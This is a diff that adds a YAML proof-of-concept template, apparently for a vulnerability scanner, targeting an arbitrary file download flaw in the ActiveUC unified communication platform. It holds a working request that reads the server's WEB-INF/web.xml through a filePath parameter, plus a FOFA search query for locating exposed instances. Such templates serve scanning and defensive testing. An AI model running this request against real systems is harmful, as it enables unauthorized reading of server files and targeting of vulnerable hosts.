@@ -1,0 +1,16 @@
+id: poc-yaml-active-downloaddocument-action-anyfile-download
+info:
+  name: 网动统一通信平台ActiveUC downloadDocument.action 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 网动统一通信平台
+  fofa: title="网动统一通信平台(Active UC)"
+requests:
+- method: GET
+  path: /acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx
+  expression: "status_code == 200 && \ncontains(body,\"<filter-name>\") &&\ncontains(body,\"\
+    web-app\") &&\ncontains(headers,\"filename=web.xml\") &&\ncontains(content_type,\"\
+    application/x-download\")\n"
+variables: {}
+transport: http
